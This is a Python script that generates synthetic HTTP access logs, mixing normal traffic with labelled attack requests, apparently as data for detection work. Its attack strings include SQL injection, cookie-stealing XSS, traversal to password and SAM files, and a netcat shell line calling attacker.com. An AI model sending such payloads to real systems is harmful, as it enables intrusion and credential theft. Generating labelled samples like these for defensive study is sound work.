#!/usr/bin/env python3
"""
HTTP Log Generator
Generates realistic HTTP access logs with normal and attack patterns
"""

import random
import datetime
import json
from typing import List, Dict

class HTTPLogGenerator:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15'
        ]

        self.malicious_user_agents = [
            'sqlmap/1.0',
            'Nikto/2.1.6',
            'Acunetix',
            'python-requests/2.0',
            '../../../etc/passwd'
        ]

        self.normal_paths = [
            '/', '/index.html', '/about', '/contact', '/products',
            '/api/users', '/api/products', '/images/logo.png',
            '/css/style.css', '/js/app.js', '/login', '/dashboard'
        ]

        self.attack_paths = [
            "/admin' OR '1'='1",
            '/../../../../etc/passwd',
            '/api/users?id=1; DROP TABLE users--',
            '/<script>alert(1)</script>',
            '/cmd.php?cmd=whoami',
            '/api/exec?command=ls -la',
            '/.git/config',
            '/.env',
            '/wp-admin/admin-ajax.php',
            '/shell.php'
        ]

        self.methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD']
        self.status_codes = [200, 201, 204, 301, 302, 304, 400, 401, 403, 404, 500, 502, 503]

        self.internal_ips = [f'192.168.1.{i}' for i in range(10, 250)]
        self.external_ips = [
            f'{random.randint(1, 223)}.{random.randint(0, 255)}.'
            f'{random.randint(0, 255)}.{random.randint(1, 254)}'
            for _ in range(100)
        ]

    def generate_normal_log(self) -> Dict:
        """Generate a normal HTTP request log"""
        timestamp = datetime.datetime.now() - datetime.timedelta(
            seconds=random.randint(0, 86400)
        )

        method = random.choice(['GET'] * 7 + ['POST'] * 2 + ['PUT'])
        path = random.choice(self.normal_paths)

        if method == 'GET':
            status = random.choice([200] * 8 + [304] * 2 + [404])
        else:
            status = random.choice([200, 201, 204, 400, 401])

        return {
            'timestamp': timestamp.isoformat(),
            'client_ip': random.choice(self.external_ips),
            'method': method,
            'path': path,
            'status_code': status,
            'response_size': random.randint(200, 50000),
            'response_time_ms': random.randint(10, 500),
            'user_agent': random.choice(self.user_agents),
            'referer': random.choice(['https://google.com', 'https://bing.com', '-', '']),
            'is_suspicious': False
        }

    def generate_attack_log(self) -> Dict:
        """Generate a suspicious/attack HTTP request log"""
        timestamp = datetime.datetime.now() - datetime.timedelta(
            seconds=random.randint(0, 86400)
        )

        attack_type = random.choice([
            'sql_injection',
            'xss',
            'path_traversal',
            'command_injection',
            'scanner',
            'brute_force'
        ])

        log = {
            'timestamp': timestamp.isoformat(),
            'client_ip': random.choice(self.external_ips),
            'is_suspicious': True,
            'attack_type': attack_type
        }

        if attack_type == 'sql_injection':
            log['method'] = 'GET'
            log['path'] = random.choice([
                "/login?user=admin' OR '1'='1",
                "/api/users?id=1 UNION SELECT password FROM users--",
                "/search?q='; DROP TABLE products--"
            ])
            log['status_code'] = random.choice([200, 400, 500])
            log['user_agent'] = random.choice(self.user_agents)

        elif attack_type == 'xss':
            log['method'] = 'GET'
            log['path'] = random.choice([
                '/<script>alert(document.cookie)</script>',
                '/search?q=<img src=x onerror=alert(1)>',
                '/comment?text=<iframe src=evil.com></iframe>'
            ])
            log['status_code'] = random.choice([200, 400])
            log['user_agent'] = random.choice(self.user_agents)

        elif attack_type == 'path_traversal':
            log['method'] = 'GET'
            log['path'] = random.choice([
                '/../../../etc/passwd',
                '/download?file=../../../../etc/shadow',
                '/images/../../../../../../windows/system32/config/sam'
            ])
            log['status_code'] = random.choice([403, 404, 500])
            log['user_agent'] = random.choice(self.user_agents)

        elif attack_type == 'command_injection':
            log['method'] = 'POST'
            log['path'] = random.choice([
                '/api/exec?cmd=whoami',
                '/run?command=ls;cat /etc/passwd',
                '/execute?input=| nc attacker.com 4444'
            ])
            log['status_code'] = random.choice([200, 400, 500])
            log['user_agent'] = random.choice(self.user_agents)

        elif attack_type == 'scanner':
            log['method'] = 'GET'
            log['path'] = random.choice(self.attack_paths)
            log['status_code'] = random.choice([404, 403])
            log['user_agent'] = random.choice(self.malicious_user_agents)

        else:  # brute_force
            log['method'] = 'POST'
            log['path'] = '/login'
            log['status_code'] = random.choice([401] * 9 + [200])
            log['user_agent'] = random.choice(self.user_agents)

        log['response_size'] = random.randint(100, 5000)
        log['response_time_ms'] = random.randint(50, 2000)
        log['referer'] = '-'

        return log

    def generate_logs(self, count: int = 1000, attack_ratio: float = 0.1) -> List[Dict]:
        """Generate a mix of normal and attack logs"""
        logs = []
        attack_count = int(count * attack_ratio)
        normal_count = count - attack_count

        for _ in range(normal_count):
            logs.append(self.generate_normal_log())

        for _ in range(attack_count):
            logs.append(self.generate_attack_log())

        logs.sort(key=lambda x: x['timestamp'])
        return logs

    def save_logs(self, logs: List[Dict], output_file: str, format: str = 'json'):
        """Save logs to file"""
        if format == 'json':
            with open(output_file, 'w') as f:
                json.dump(logs, f, indent=2)

        elif format == 'csv':
            import csv
            if logs:
                with open(output_file, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=logs[0].keys())
                    writer.writeheader()
                    writer.writerows(logs)

        elif format == 'apache':
            with open(output_file, 'w') as f:
                for log in logs:
                    apache_log = (
                        f"{log['client_ip']} - - [{log['timestamp']}] "
                        f"\"{log['method']} {log['path']} HTTP/1.1\" "
                        f"{log['status_code']} {log['response_size']} "
                        f"\"{log.get('referer', '-')}\" \"{log['user_agent']}\"\n"
                    )
                    f.write(apache_log)


if __name__ == '__main__':
    generator = HTTPLogGenerator()

    print("Generating HTTP logs...")
    logs = generator.generate_logs(count=1000, attack_ratio=0.12)

    generator.save_logs(logs, '../data/http_logs.json', format='json')
    generator.save_logs(logs, '../data/http_logs.csv', format='csv')
    generator.save_logs(logs, '../logs/apache_access.log', format='apache')

    print(f"Generated {len(logs)} HTTP logs")
    attacks = sum(1 for log in logs if log.get('is_suspicious', False))
    print(f"Attack logs: {attacks} ({attacks/len(logs)*100:.2f}%)")
